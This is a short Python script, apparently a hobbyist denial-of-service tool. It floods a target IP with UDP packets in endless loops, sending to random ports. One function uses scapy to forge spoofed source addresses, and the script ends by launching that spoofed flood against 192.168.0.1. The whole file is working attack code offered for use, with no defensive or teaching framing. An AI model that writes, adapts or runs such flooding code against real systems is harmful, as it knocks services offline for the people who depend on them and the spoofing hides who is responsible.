import socket
from scapy.all import *
from rport import *
def udp_attack(ip):

	print("Initializing DDOS-UDP")
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	message = b'You are being DDOS-UDP.'
	counter = 0
	while 1:
		#s.bind((spoof_ipv4(),randomize_port()))
		port = randomize_port()
		s.sendto(message,(ip,port))
		counter+=1
		print(str(counter) + "attacks at port:" + str(port))

#udp_attack("192.168.0.1")

def spoof_udp_attack(ip):
	message = b'You are being DDOS-UDP.'

	while 1:
		src = spoof_ipv4()
		sport = randomize_port()
		dport = randomize_port()
		packet = IP(src=src,dst=ip)/UDP(sport=sport,dport=dport)/message
		send(packet)
		print(src + "attacks from port " + str(sport) +" to " + str(dport))

spoof_udp_attack("192.168.0.1")


